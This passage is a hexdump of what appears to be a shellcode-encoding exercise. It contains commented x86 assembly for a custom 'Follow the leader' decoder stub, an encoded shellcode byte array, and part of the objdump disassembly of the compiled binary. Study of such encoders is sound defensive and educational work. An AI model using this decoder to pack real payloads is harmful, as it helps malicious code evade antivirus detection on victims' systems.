000014c0  20 73 68 6f 72 74 20 63  61 6c 6c 5f 73 68 65 6c  | short call_shel|
000014d0  6c 63 6f 64 65 0a 64 65  63 6f 64 65 72 3a 0a 20  |lcode.decoder:. |
000014e0  20 20 20 70 6f 70 20 65  73 69 20 20 20 20 20 20  |   pop esi      |
000014f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001500  3b 20 41 64 64 72 65 73  73 20 6f 66 20 45 6e 63  |; Address of Enc|
00001510  6f 64 65 64 53 68 65 6c  6c 63 6f 64 65 20 74 6f  |odedShellcode to|
00001520  20 45 53 49 0a 20 20 20  20 6c 65 61 20 65 64 69  | ESI.    lea edi|
00001530  2c 20 5b 65 73 69 5d 20  20 20 20 20 20 20 20 20  |, [esi]         |
00001540  20 20 20 20 20 20 3b 20  4c 6f 61 64 20 65 66 66  |      ; Load eff|
00001550  65 63 74 69 76 65 20 61  64 64 72 65 73 73 20 6f  |ective address o|
00001560  66 20 77 68 61 74 20 69  73 20 63 6f 6e 74 61 69  |f what is contai|
00001570  6e 65 64 20 6f 6e 20 45  44 49 0a 20 20 20 20 78  |ned on EDI.    x|
00001580  6f 72 20 65 63 78 2c 20  65 63 78 20 20 20 20 20  |or ecx, ecx     |
00001590  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 5a 65  |            ; Ze|
000015a0  72 6f 20 45 43 58 0a 20  20 20 20 6d 75 6c 20 65  |ro ECX.    mul e|
000015b0  63 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |cx              |
000015c0  20 20 20 20 20 20 20 20  3b 20 54 68 69 73 20 69  |        ; This i|
000015d0  6e 73 74 72 75 63 74 69  6f 6e 20 77 69 6c 6c 20  |nstruction will |
000015e0  63 61 75 73 65 20 62 6f  74 68 20 45 41 58 20 61  |cause both EAX a|
000015f0  6e 64 20 45 44 58 20 74  6f 20 62 65 63 6f 6d 65  |nd EDX to become|
00001600  20 7a 65 72 6f 0a 20 20  20 20 78 6f 72 20 65 62  | zero.    xor eb|
00001610  70 2c 20 65 62 70 20 20  20 20 20 20 20 20 20 20  |p, ebp          |
00001620  20 20 20 20 20 20 20 3b  20 5a 65 72 6f 20 74 68  |       ; Zero th|
00001630  65 20 76 61 6c 75 65 20  6f 6e 20 45 42 50 20 0a  |e value on EBP .|
00001640  20 20 20 20 6d 6f 76 20  64 6c 2c 20 62 79 74 65  |    mov dl, byte|
00001650  20 5b 65 73 69 5d 20 20  20 20 20 20 20 20 20 20  | [esi]          |
00001660  20 3b 20 50 75 74 20 74  68 65 20 4c 45 41 44 45  | ; Put the LEADE|
00001670  52 20 62 79 74 65 20 74  6f 20 45 44 58 20 28 44  |R byte to EDX (D|
00001680  4c 29 20 0a 20 20 0a 3b  28 66 69 72 73 74 62 20  |L) .  .;(firstb |
00001690  2d 20 73 65 63 6f 6e 64  62 29 20 43 41 4c 43 55  |- secondb) CALCU|
000016a0  4c 41 54 49 4f 4e 20 20  0a 20 20 20 20 6d 6f 76  |LATION  .    mov|
000016b0  20 61 6c 2c 20 64 6c 20  20 20 20 20 20 20 20 20  | al, dl         |
000016c0  20 20 20 20 20 20 20 20  20 20 3b 20 43 6f 70 79  |          ; Copy|
000016d0  20 74 68 65 20 4c 45 41  44 45 52 20 74 6f 20 45  | the LEADER to E|
000016e0  41 58 0a 20 20 0a 20 20  20 20 3b 66 69 72 73 74  |AX.  .    ;first|
000016f0  62 20 65 78 74 72 61 63  74 69 6f 6e 20 6f 66 20  |b extraction of |
00001700  4c 45 41 44 45 52 0a 20  20 20 20 73 68 72 20 64  |LEADER.    shr d|
00001710  6c 2c 20 34 20 20 20 20  20 20 20 20 20 20 20 20  |l, 4            |
00001720  20 20 20 20 20 20 20 20  3b 20 4b 65 65 70 20 6f  |        ; Keep o|
00001730  6e 6c 79 20 74 68 65 20  34 20 68 69 67 68 20 62  |nly the 4 high b|
00001740  69 74 73 20 6f 66 20 4c  45 41 44 45 52 20 74 6f  |its of LEADER to|
00001750  20 44 4c 20 28 69 66 20  4c 65 61 64 65 72 3d 61  | DL (if Leader=a|
00001760  63 20 74 68 65 6e 20 44  4c 3d 61 29 20 5b 66 69  |c then DL=a) [fi|
00001770  72 73 74 62 5d 0a 20 20  20 0a 20 20 20 20 3b 73  |rstb].   .    ;s|
00001780  65 63 6f 6e 64 62 20 65  78 74 72 61 63 74 69 6f  |econdb extractio|
00001790  6e 20 6f 66 20 4c 45 41  44 45 52 0a 20 20 20 20  |n of LEADER.    |
000017a0  73 68 6c 20 65 61 78 2c  20 32 38 20 20 20 20 20  |shl eax, 28     |
000017b0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 73  |             ; s|
000017c0  68 69 66 74 20 6c 65 66  74 20 32 38 20 62 69 74  |hift left 28 bit|
000017d0  73 20 6f 66 20 45 41 58  20 77 68 69 63 68 20 63  |s of EAX which c|
000017e0  6f 6e 74 61 69 6e 73 20  74 68 65 20 76 61 6c 75  |ontains the valu|
000017f0  65 20 6f 66 20 4c 65 61  64 65 72 20 6f 6e 20 61  |e of Leader on a|
00001800  6c 0a 20 20 20 20 73 68  72 20 65 61 78 2c 20 32  |l.    shr eax, 2|
00001810  38 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |8               |
00001820  20 20 20 3b 20 73 68 69  66 74 20 72 69 67 68 74  |   ; shift right|
00001830  20 32 38 20 6f 66 20 45  41 58 20 28 69 66 20 45  | 28 of EAX (if E|
00001840  41 58 3d 30 78 63 30 30  30 30 30 30 30 20 6e 6f  |AX=0xc0000000 no|
00001850  77 20 45 41 58 3d 30 78  30 30 30 30 30 30 30 63  |w EAX=0x0000000c|
00001860  29 20 5b 73 65 63 6f 6e  64 62 5d 0a 20 20 20 20  |) [secondb].    |
00001870  73 75 62 20 64 6c 2c 20  61 6c 20 20 20 20 20 20  |sub dl, al      |
00001880  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 28  |             ; (|
00001890  66 69 72 73 74 62 20 2d  20 73 65 63 6f 6e 64 62  |firstb - secondb|
000018a0  29 20 76 61 6c 75 65 20  73 74 6f 72 65 64 20 74  |) value stored t|
000018b0  6f 20 45 44 58 20 28 44  4c 29 0a 20 20 20 20 6a  |o EDX (DL).    j|
000018c0  6e 73 20 64 65 63 6f 64  65 5f 70 72 20 20 20 20  |ns decode_pr    |
000018d0  0a 6e 65 67 61 74 69 76  65 3a 20 20 20 20 20 20  |.negative:      |
000018e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000018f0  20 20 3b 20 43 61 6c 63  75 6c 61 74 65 20 74 68  |  ; Calculate th|
00001900  65 20 61 62 73 6f 6c 75  74 65 20 76 61 6c 75 65  |e absolute value|
00001910  20 69 66 20 6e 65 67 61  74 69 76 65 20 20 0a 20  | if negative  . |
00001920  20 20 20 6e 6f 74 20 64  6c 0a 20 20 20 20 69 6e  |   not dl.    in|
00001930  63 20 64 6c 0a 3b 64 65  63 6f 64 65 20 70 72 6f  |c dl.;decode pro|
00001940  63 65 73 73 0a 64 65 63  6f 64 65 5f 70 72 3a 0a  |cess.decode_pr:.|
00001950  20 20 20 20 78 6f 72 20  65 61 78 2c 20 65 61 78  |    xor eax, eax|
00001960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001970  0a 20 20 20 20 78 6f 72  20 65 62 78 2c 20 65 62  |.    xor ebx, eb|
00001980  78 0a 20 20 20 20 78 6f  72 20 65 63 78 2c 20 65  |x.    xor ecx, e|
00001990  63 78 0a 20 20 20 20 6d  6f 76 20 61 6c 2c 20 62  |cx.    mov al, b|
000019a0  79 74 65 20 5b 65 73 69  2b 31 2b 65 62 70 5d 20  |yte [esi+1+ebp] |
000019b0  20 20 20 20 3b 20 50 75  74 20 74 68 65 20 65 6e  |    ; Put the en|
000019c0  63 6f 64 65 64 20 62 79  74 65 20 74 6f 20 45 41  |coded byte to EA|
000019d0  58 0a 20 20 20 20 6d 6f  76 20 65 63 78 2c 20 65  |X.    mov ecx, e|
000019e0  62 70 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |bp              |
000019f0  20 20 20 3b 20 45 42 50  20 69 73 20 75 73 65 64  |   ; EBP is used|
00001a00  20 61 73 20 61 20 63 6f  75 6e 74 65 72 20 63 6f  | as a counter co|
00001a10  70 79 20 74 68 65 20 76  61 6c 75 65 20 6f 66 20  |py the value of |
00001a20  45 42 50 20 74 6f 20 45  43 58 0a 20 20 20 20 78  |EBP to ECX.    x|
00001a30  6f 72 20 63 6c 2c 20 30  78 33 32 20 20 20 20 20  |or cl, 0x32     |
00001a40  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 41 74  |            ; At|
00001a50  20 74 68 65 20 65 6e 64  20 6f 66 20 74 68 65 20  | the end of the |
00001a60  73 68 65 6c 6c 63 6f 64  65 20 45 42 50 20 73 68  |shellcode EBP sh|
00001a70  6f 75 6c 64 20 70 6f 69  6e 74 20 35 30 20 69 6e  |ould point 50 in|
00001a80  20 64 65 63 69 6d 61 6c  20 33 32 20 69 6e 20 68  | decimal 32 in h|
00001a90  65 78 0a 20 20 20 20 6a  65 20 73 68 6f 72 74 20  |ex.    je short |
00001aa0  45 6e 63 6f 64 65 64 53  68 65 6c 6c 63 6f 64 65  |EncodedShellcode|
00001ab0  20 20 20 0a 20 20 0a 20  20 20 20 3b 72 65 76 5f  |   .  .    ;rev_|
00001ac0  73 75 70 6c 78 20 43 61  6c 63 75 6c 61 74 69 6f  |suplx Calculatio|
00001ad0  6e 0a 20 20 20 20 6d 6f  76 20 63 6c 2c 20 61 6c  |n.    mov cl, al|
00001ae0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001af0  20 20 20 3b 20 50 75 74  20 74 68 65 20 45 6e 63  |   ; Put the Enc|
00001b00  6f 64 65 64 20 62 79 74  65 20 74 6f 20 45 41 58  |oded byte to EAX|
00001b10  20 28 78 78 78 20 74 6f  20 45 41 58 29 0a 20 20  | (xxx to EAX).  |
00001b20  20 20 73 75 62 20 63 6c  2c 20 64 6c 20 20 20 20  |  sub cl, dl    |
00001b30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00001b40  20 72 65 76 5f 73 75 70  6c 78 3d 20 78 78 78 2d  | rev_suplx= xxx-|
00001b50  28 66 69 72 73 74 62 20  2d 20 73 65 63 6f 6e 64  |(firstb - second|
00001b60  62 29 20 76 61 6c 75 65  20 73 74 6f 72 65 64 20  |b) value stored |
00001b70  74 6f 20 43 4c 0a 20 20  20 20 6d 6f 76 20 62 6c  |to CL.    mov bl|
00001b80  2c 20 63 6c 20 20 20 20  20 20 20 20 20 20 20 20  |, cl            |
00001b90  20 20 20 20 20 20 20 3b  20 4b 65 65 70 20 42 61  |       ; Keep Ba|
00001ba0  63 6b 75 70 20 6f 66 20  72 65 76 5f 73 75 70 6c  |ckup of rev_supl|
00001bb0  78 20 74 6f 20 42 4c 0a  20 20 20 20 6d 6f 76 20  |x to BL.    mov |
00001bc0  61 6c 2c 20 63 6c 20 20  20 20 20 20 20 20 20 20  |al, cl          |
00001bd0  20 20 20 20 20 20 20 20  20 3b 20 53 65 63 6f 6e  |         ; Secon|
00001be0  64 20 62 61 63 6b 75 70  20 6f 66 20 43 4c 20 20  |d backup of CL  |
00001bf0  20 0a 20 20 20 20 0a 20  20 20 20 3b 52 65 76 65  | .    .    ;Reve|
00001c00  72 74 20 74 68 65 20 62  79 74 65 73 20 6f 6e 20  |rt the bytes on |
00001c10  72 65 76 5f 73 75 70 6c  78 20 0a 20 20 20 20 73  |rev_suplx .    s|
00001c20  68 72 20 62 6c 2c 20 34  20 20 20 20 20 20 20 20  |hr bl, 4        |
00001c30  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 73 68  |            ; sh|
00001c40  69 66 74 20 34 20 62 69  74 73 20 72 69 67 68 74  |ift 4 bits right|
00001c50  20 28 69 66 20 77 61 73  20 62 6c 3d 65 63 20 6e  | (if was bl=ec n|
00001c60  6f 77 20 62 6c 3d 65 29  0a 20 20 20 20 73 68 6c  |ow bl=e).    shl|
00001c70  20 65 61 78 2c 20 32 38  20 20 20 20 20 20 20 20  | eax, 28        |
00001c80  20 20 20 20 20 20 20 20  20 20 3b 20 73 68 69 66  |          ; shif|
00001c90  74 20 6c 65 66 74 20 32  38 20 62 69 74 73 20 6f  |t left 28 bits o|
00001ca0  66 20 45 41 58 20 77 68  69 63 68 20 63 6f 6e 74  |f EAX which cont|
00001cb0  61 69 6e 73 20 74 68 65  20 76 61 6c 75 65 20 6f  |ains the value o|
00001cc0  66 20 72 65 76 5f 73 75  70 6c 20 6f 6e 20 63 6c  |f rev_supl on cl|
00001cd0  28 20 69 66 20 45 41 58  20 77 61 73 20 30 78 65  |( if EAX was 0xe|
00001ce0  63 20 6e 6f 77 20 45 41  58 3d 30 78 63 30 30 30  |c now EAX=0xc000|
00001cf0  30 30 30 30 29 20 0a 20  20 20 20 73 68 72 20 65  |0000) .    shr e|
00001d00  61 78 2c 20 32 34 20 20  20 20 20 20 20 20 20 20  |ax, 24          |
00001d10  20 20 20 20 20 20 20 20  3b 20 73 68 69 66 74 20  |        ; shift |
00001d20  72 69 67 68 74 20 32 34  20 6f 66 20 45 41 58 20  |right 24 of EAX |
00001d30  28 69 66 20 45 41 58 3d  30 78 63 30 30 30 30 30  |(if EAX=0xc00000|
00001d40  30 30 20 6e 6f 77 20 45  41 58 3d 30 78 30 30 30  |00 now EAX=0x000|
00001d50  30 30 30 63 30 29 0a 20  20 20 20 61 64 64 20 65  |000c0).    add e|
00001d60  61 78 2c 20 65 62 78 20  20 20 20 20 20 20 20 20  |ax, ebx         |
00001d70  20 20 20 20 20 20 20 20  3b 20 61 64 64 20 74 68  |        ; add th|
00001d80  65 20 76 61 6c 75 65 20  6f 6e 20 45 42 58 20 74  |e value on EBX t|
00001d90  6f 20 45 41 58 20 28 69  66 20 45 41 58 3d 30 78  |o EAX (if EAX=0x|
00001da0  30 30 30 30 30 30 63 30  20 2b 20 42 4c 3d 30 78  |000000c0 + BL=0x|
00001db0  65 2c 20 45 41 58 3d 30  78 30 30 30 30 30 30 30  |e, EAX=0x0000000|
00001dc0  63 65 29 0a 20 0a 20 20  20 20 3b 53 75 70 70 6c  |ce). .    ;Suppl|
00001dd0  65 6d 65 6e 74 20 43 61  6c 63 75 6c 61 74 69 6f  |ement Calculatio|
00001de0  6e 0a 20 20 20 20 6d 6f  76 20 62 6c 2c 20 30 78  |n.    mov bl, 0x|
00001df0  66 66 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |ff              |
00001e00  20 20 20 3b 20 56 61 6c  75 65 20 6f 66 20 20 30  |   ; Value of  0|
00001e10  78 66 66 20 74 6f 20 42  4c 0a 20 20 20 20 73 75  |xff to BL.    su|
00001e20  62 20 62 6c 2c 20 61 6c  20 20 20 20 20 20 20 20  |b bl, al        |
00001e30  20 20 20 20 20 20 20 20  20 20 20 3b 20 43 61 6c  |           ; Cal|
00001e40  63 75 6c 61 74 65 20 74  68 65 20 53 75 70 70 6c  |culate the Suppl|
00001e50  65 6d 65 6e 74 0a 20 20  20 20 6d 6f 76 20 62 79  |ement.    mov by|
00001e60  74 65 20 5b 65 64 69 5d  2c 20 62 6c 20 20 20 20  |te [edi], bl    |
00001e70  20 20 20 20 20 20 20 3b  20 50 75 74 20 74 68 65  |       ; Put the|
00001e80  20 64 65 63 6f 64 65 64  20 62 79 74 65 20 74 6f  | decoded byte to|
00001e90  20 74 68 65 20 70 6f 73  69 74 69 6f 6e 20 6f 66  | the position of|
00001ea0  20 45 44 49 0a 20 20 20  20 69 6e 63 20 65 64 69  | EDI.    inc edi|
00001eb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001ec0  20 20 20 20 20 20 3b 20  45 44 49 20 69 73 20 61  |      ; EDI is a|
00001ed0  20 70 6f 69 6e 74 65 72  20 74 6f 20 74 68 65 20  | pointer to the |
00001ee0  70 6f 73 69 74 69 6f 6e  20 77 68 69 63 68 20 74  |position which t|
00001ef0  68 65 20 64 65 63 6f 64  65 64 20 62 79 74 65 73  |he decoded bytes|
00001f00  20 77 69 6c 6c 20 62 65  20 73 74 6f 72 65 64 0a  | will be stored.|
00001f10  20 20 20 20 61 64 64 20  65 62 70 2c 30 78 32 20  |    add ebp,0x2 |
00001f20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001f30  20 3b 20 54 68 65 20 45  42 50 20 69 73 20 61 20  | ; The EBP is a |
00001f40  63 6f 75 6e 74 65 72 20  76 61 6c 75 65 73 20 77  |counter values w|
00001f50  69 6c 6c 20 62 65 20 28  32 2c 34 2c 36 2c 2e 2e  |ill be (2,4,6,..|
00001f60  35 30 29 0a 20 20 20 20  6a 6d 70 20 73 68 6f 72  |50).    jmp shor|
00001f70  74 20 64 65 63 6f 64 65  5f 70 72 20 20 20 20 20  |t decode_pr     |
00001f80  20 20 20 20 20 3b 20 47  6f 74 6f 20 74 68 65 20  |     ; Goto the |
00001f90  64 65 63 6f 64 65 20 70  72 6f 63 65 73 73 20 74  |decode process t|
00001fa0  6f 20 64 65 63 6f 64 65  20 74 68 65 20 6e 65 78  |o decode the nex|
00001fb0  74 20 62 79 74 65 73 0a  20 0a 63 61 6c 6c 5f 73  |t bytes. .call_s|
00001fc0  68 65 6c 6c 63 6f 64 65  3a 0a 20 20 20 20 63 61  |hellcode:.    ca|
00001fd0  6c 6c 20 64 65 63 6f 64  65 72 0a 20 20 20 20 45  |ll decoder.    E|
00001fe0  6e 63 6f 64 65 64 53 68  65 6c 6c 63 6f 64 65 3a  |ncodedShellcode:|
00001ff0  20 64 62 20 30 78 34 33  2c 30 78 65 64 2c 30 78  | db 0x43,0xed,0x|
00002000  31 64 2c 30 78 66 34 2c  30 78 34 30 2c 30 78 66  |1d,0xf4,0x40,0xf|
00002010  62 2c 30 78 36 66 2c 30  78 37 61 2c 30 78 61 39  |b,0x6f,0x7a,0xa9|
00002020  2c 30 78 65 2c 30 78 62  36 2c 30 78 65 2c 30 78  |,0xe,0xb6,0xe,0x|
00002030  62 63 2c 30 78 63 39 2c  30 78 65 33 2c 30 78 37  |bc,0xc9,0xe3,0x7|
00002040  61 2c 30 78 61 66 2c 30  78 37 61 2c 30 78 37 38  |a,0xaf,0x7a,0x78|
00002050  2c 30 78 65 2c 30 78 63  35 2c 30 78 64 61 2c 30  |,0xe,0xc5,0xda,0|
00002060  78 37 36 2c 30 78 36 61  2c 30 78 31 37 2c 30 78  |x76,0x6a,0x17,0x|
00002070  31 61 2c 30 78 34 65 2c  30 78 36 38 2c 30 78 33  |1a,0x4e,0x68,0x3|
00002080  38 2c 30 78 63 32 2c 30  78 39 39 2c 30 78 66 62  |8,0xc2,0x99,0xfb|
00002090  2c 30 78 33 35 2c 30 78  36 38 2c 30 78 38 34 2c  |,0x35,0x68,0x84,|
000020a0  30 78 64 32 2c 30 78 62  33 2c 30 78 63 62 2c 30  |0xd2,0xb3,0xcb,0|
000020b0  78 37 63 2c 30 78 36 38  2c 30 78 37 38 2c 30 78  |x7c,0x68,0x78,0x|
000020c0  65 32 2c 30 78 39 61 2c  30 78 66 35 2c 30 78 65  |e2,0x9a,0xf5,0xe|
000020d0  39 2c 30 78 35 30 2c 30  78 63 30 2c 30 78 32 34  |9,0x50,0xc0,0x24|
000020e0  2c 30 78 39 31 2c 30 78  66 38 2c 30 78 66 65 0a  |,0x91,0xf8,0xfe.|
000020f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002170  2d 2d 2d 2d 2d 2d 2d 0a  24 20 6f 62 6a 64 75 6d  |-------.$ objdum|
00002180  70 20 2d 64 20 2e 2f 46  6f 6c 6c 6f 77 74 68 65  |p -d ./Followthe|
00002190  6c 65 61 64 65 72 2d 64  65 63 6f 64 65 72 20 2d  |leader-decoder -|
000021a0  4d 20 69 6e 74 65 6c 0a  2e 2f 46 6f 6c 6c 6f 77  |M intel../Follow|
000021b0  74 68 65 6c 65 61 64 65  72 2d 64 65 63 6f 64 65  |theleader-decode|
000021c0  72 3a 20 20 20 20 20 66  69 6c 65 20 66 6f 72 6d  |r:     file form|
000021d0  61 74 20 65 6c 66 33 32  2d 69 33 38 36 0a 44 69  |at elf32-i386.Di|
000021e0  73 61 73 73 65 6d 62 6c  79 20 6f 66 20 73 65 63  |sassembly of sec|
000021f0  74 69 6f 6e 20 2e 74 65  78 74 3a 0a 30 38 30 34  |tion .text:.0804|
00002200  38 30 36 30 20 3c 5f 73  74 61 72 74 3e 3a 0a 20  |8060 <_start>:. |
00002210  38 30 34 38 30 36 30 3a  20 20 20 20 20 20 20 65  |8048060:       e|
00002220  62 20 34 65 20 20 20 20  20 20 20 20 20 20 20 20  |b 4e            |
00002230  20 20 20 20 20 20 20 6a  6d 70 20 20 20 20 38 30  |       jmp    80|
00002240  34 38 30 62 30 20 3c 63  61 6c 6c 5f 73 68 65 6c  |480b0 <call_shel|
00002250  6c 63 6f 64 65 3e 0a 30  38 30 34 38 30 36 32 20  |lcode>.08048062 |
00002260  3c 64 65 63 6f 64 65 72  3e 3a 0a 20 38 30 34 38  |<decoder>:. 8048|
00002270  30 36 32 3a 20 20 20 20  20 20 20 35 65 20 20 20  |062:       5e   |
00002280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002290  20 20 20 70 6f 70 20 20  20 20 65 73 69 0a 20 38  |   pop    esi. 8|
000022a0  30 34 38 30 36 33 3a 20  20 20 20 20 20 20 38 64  |048063:       8d|
000022b0  20 33 65 20 20 20 20 20  20 20 20 20 20 20 20 20  | 3e             |
000022c0  20 20 20 20 20 20 6c 65  61 20 20 20 20 65 64 69  |      lea    edi|
000022d0  2c 5b 65 73 69 5d 0a 20  38 30 34 38 30 36 35 3a  |,[esi]. 8048065:|
000022e0  20 20 20 20 20 20 20 33  31 20 63 39 20 20 20 20  |       31 c9    |
000022f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
00002300  6f 72 20 20 20 20 65 63  78 2c 65 63 78 0a 20 38  |or    ecx,ecx. 8|
00002310  30 34 38 30 36 37 3a 20  20 20 20 20 20 20 66 37  |048067:       f7|
00002320  20 65 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | e1             |
00002330  20 20 20 20 20 20 6d 75  6c 20 20 20 20 65 63 78  |      mul    ecx|
00002340  0a 20 38 30 34 38 30 36  39 3a 20 20 20 20 20 20  |. 8048069:      |
00002350  20 33 31 20 65 64 20 20  20 20 20 20 20 20 20 20  | 31 ed          |
00002360  20 20 20 20 20 20 20 20  20 78 6f 72 20 20 20 20  |         xor    |
00002370  65 62 70 2c 65 62 70 0a  20 38 30 34 38 30 36 62  |ebp,ebp. 804806b|
00002380  3a 20 20 20 20 20 20 20  38 61 20 31 36 20 20 20  |:       8a 16   |
00002390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000023a0  6d 6f 76 20 20 20 20 64  6c 2c 42 59 54 45 20 50  |mov    dl,BYTE P|
000023b0  54 52 20 5b 65 73 69 5d  0a 20 38 30 34 38 30 36  |TR [esi]. 804806|
000023c0  64 3a 20 20 20 20 20 20  20 38 38 20 64 30 20 20  |d:       88 d0  |
000023d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000023e0  20 6d 6f 76 20 20 20 20  61 6c 2c 64 6c 0a 20 38  | mov    al,dl. 8|
000023f0  30 34 38 30 36 66 3a 20  20 20 20 20 20 20 63 30  |04806f:       c0|
00002400  20 65 61 20 30 34 20 20  20 20 20 20 20 20 20 20  | ea 04          |
00002410  20 20 20 20 20 20 73 68  72 20 20 20 20 64 6c 2c  |      shr    dl,|
00002420  30 78 34 0a 20 38 30 34  38 30 37 32 3a 20 20 20  |0x4. 8048072:   |
00002430  20 20 20 20 63 31 20 65  30 20 31 63 20 20 20 20  |    c1 e0 1c    |
00002440  20 20 20 20 20 20 20 20  20 20 20 20 73 68 6c 20  |            shl |
00002450  20 20 20 65 61 78 2c 30  78 31 63 0a 20 38 30 34  |   eax,0x1c. 804|
00002460  38 30 37 35 3a 20 20 20  20 20 20 20 63 31 20 65  |8075:       c1 e|
00002470  38 20 31 63 20 20 20 20  20 20 20 20 20 20 20 20  |8 1c            |
00002480  20 20 20 20 73 68 72 20  20 20 20 65 61 78 2c 30  |    shr    eax,0|
00002490  78 31 63 0a 20 38 30 34  38 30 37 38 3a 20 20 20  |x1c. 8048078:   |
000024a0  20 20 20 20 32 38 20 63  32 20 20 20 20 20 20 20  |    28 c2       |
000024b0  20 20 20 20 20 20 20 20  20 20 20 20 73 75 62 20  |            sub |
000024c0  20 20 20 64 6c 2c 61 6c  0a 20 38 30 34 38 30 37  |   dl,al. 804807|
000024d0  61 3a 20 20 20 20 20 20  20 37 39 20 30 34 20 20  |a:       79 04  |
000024e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000024f0  20 6a 6e 73 20 20 20 20  38 30 34 38 30 38 30 20  | jns    8048080 |
00002500  3c 64 65 63 6f 64 65 5f  70 72 3e 0a 30 38 30 34  |<decode_pr>.0804|
00002510  38 30 37 63 20 3c 6e 65  67 61 74 69 76 65 3e 3a  |807c <negative>:|
00002520  0a 20 38 30 34 38 30 37  63 3a 20 20 20 20 20 20  |. 804807c:      |
00002530  20 66 36 20 64 32 20 20  20 20 20 20 20 20 20 20  | f6 d2          |
00002540  20 20 20 20 20 20 20 20  20 6e 6f 74 20 20 20 20  |         not    |
00002550  64 6c 0a 20 38 30 34 38  30 37 65 3a 20 20 20 20  |dl. 804807e:    |
00002560  20 20 20 66 65 20 63 32  20 20 20 20 20 20 20 20  |   fe c2        |
00002570  20 20 20 20 20 20 20 20  20 20 20 69 6e 63 20 20  |           inc  |
00002580  20 20 64 6c 0a 30 38 30  34 38 30 38 30 20 3c 64  |  dl.08048080 <d|
00002590  65 63 6f 64 65 5f 70 72  3e 3a 0a 20 38 30 34 38  |ecode_pr>:. 8048|
000025a0  30 38 30 3a 20 20 20 20  20 20 20 33 31 20 63 30  |080:       31 c0|
000025b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000025c0  20 20 20 78 6f 72 20 20  20 20 65 61 78 2c 65 61  |   xor    eax,ea|
000025d0  78 0a 20 38 30 34 38 30  38 32 3a 20 20 20 20 20  |x. 8048082:     |
000025e0  20 20 33 31 20 64 62 20  20 20 20 20 20 20 20 20  |  31 db         |
000025f0  20 20 20 20 20 20 20 20  20 20 78 6f 72 20 20 20  |          xor   |
00002600  20 65 62 78 2c 65 62 78  0a 20 38 30 34 38 30 38  | ebx,ebx. 804808|
00002610  34 3a 20 20 20 20 20 20  20 33 31 20 63 39 20 20  |4:       31 c9  |
00002620  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002630  20 78 6f 72 20 20 20 20  65 63 78 2c 65 63 78 0a  | xor    ecx,ecx.|
00002640  20 38 30 34 38 30 38 36  3a 20 20 20 20 20 20 20  | 8048086:       |
00002650  38 61 20 34 34 20 32 65  20 30 31 20 20 20 20 20  |8a 44 2e 01     |
00002660  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 61  |        mov    a|
00002670  6c 2c 42 59 54 45 20 50  54 52 20 5b 65 73 69 2b  |l,BYTE PTR [esi+|
00002680  65 62 70 2a 31 2b 30 78  31 5d 0a 20 38 30 34 38  |ebp*1+0x1]. 8048|
00002690  30 38 61 3a 20 20 20 20  20 20 20 38 39 20 65 39  |08a:       89 e9|
000026a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000026b0  20 20 20 6d 6f 76 20 20  20 20 65 63 78 2c 65 62  |   mov    ecx,eb|
000026c0  70 0a 20 38 30 34 38 30  38 63 3a 20 20 20 20 20  |p. 804808c:     |
000026d0  20 20 38 30 20 66 31 20  33 32 20 20 20 20 20 20  |  80 f1 32      |
000026e0  20 20 20 20 20 20 20 20  20 20 78 6f 72 20 20 20  |          xor   |
000026f0  20 63 6c 2c 30 78 33 32  0a 20 38 30 34 38 30 38  | cl,0x32. 804808|
00002700  66 3a 20 20 20 20 20 20  20 37 34 20 32 34 20 20  |f:       74 24  |
00002710  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002720  20 6a 65 20 20 20 20 20  38 30 34 38 30 62 35 20  | je     80480b5 |
00002730  3c 45 6e 63 6f 64 65 64  53 68 65 6c 6c 63 6f 64  |<EncodedShellcod|
00002740  65 3e 0a 20 38 30 34 38  30 39 31 3a 20 20 20 20  |e>. 8048091:    |
00002750  20 20 20 38 38 20 63 31  20 20 20 20 20 20 20 20  |   88 c1        |
00002760  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
00002770  20 20 63 6c 2c 61 6c 0a  20 38 30 34 38 30 39 33  |  cl,al. 8048093|
00002780  3a 20 20 20 20 20 20 20  32 38 20 64 31 20 20 20  |:       28 d1   |
00002790  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000027a0  73 75 62 20 20 20 20 63  6c 2c 64 6c 0a 20 38 30  |sub    cl,dl. 80|
000027b0  34 38 30 39 35 3a 20 20  20 20 20 20 20 38 38 20  |48095:       88 |
000027c0  63 62 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |cb              |
000027d0  20 20 20 20 20 6d 6f 76  20 20 20 20 62 6c 2c 63  |     mov    bl,c|
000027e0  6c 0a 20 38 30 34 38 30  39 37 3a 20 20 20 20 20  |l. 8048097:     |
000027f0  20 20 38 38 20 63 38 20  20 20 20 20 20 20 20 20  |  88 c8         |
